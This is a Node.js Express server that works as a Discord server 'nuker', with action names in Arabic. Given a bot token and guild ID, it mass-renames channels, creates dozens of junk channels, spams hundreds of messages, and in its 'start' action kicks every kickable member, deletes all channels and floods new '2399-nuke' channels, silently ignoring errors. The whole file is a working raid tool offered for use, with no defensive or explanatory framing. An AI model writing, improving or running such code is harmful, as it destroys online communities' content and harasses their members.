const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors(), bodyParser.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    const client = new Client({ intents: [3276799] });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);

        if (action === 'تغيير الأسماء') {
            guild.channels.cache.forEach(c => c.setName(customName || 'Group 2399').catch(() => {}));
        }

        if (action === 'إنشاء رومات') {
            for (let i = 0; i < 60; i++) {
                guild.channels.create({ name: customName || 'group-2399', type: ChannelType.GuildText })
                .catch(() => {});
            }
        }

        if (action === 'إرسال سبام') {
            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(c => {
                for (let i = 0; i < 100; i++) {
                    c.send(customMsg || '# Group 2399 is here').catch(() => {});
                }
            });
        }

        if (action === 'ابدأ') {
            // تنفيذ الكل بترتيب انفجاري
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            for (let i = 0; i < 60; i++) {
                guild.channels.create({ name: customName || '2399-nuke', type: ChannelType.GuildText })
                .then(c => { for(let j=0; j<100; j++) c.send(customMsg || '# 2399').catch(() => {}); });
            }
        }

        res.send({ status: '✅ تم إطلاق العملية بنجاح!' });
    } catch (e) {
        res.status(500).send({ status: '❌ خطأ في البيانات أو الصلاحيات' });
    }
});

app.listen(3000, () => console.log('Lord System Active'));
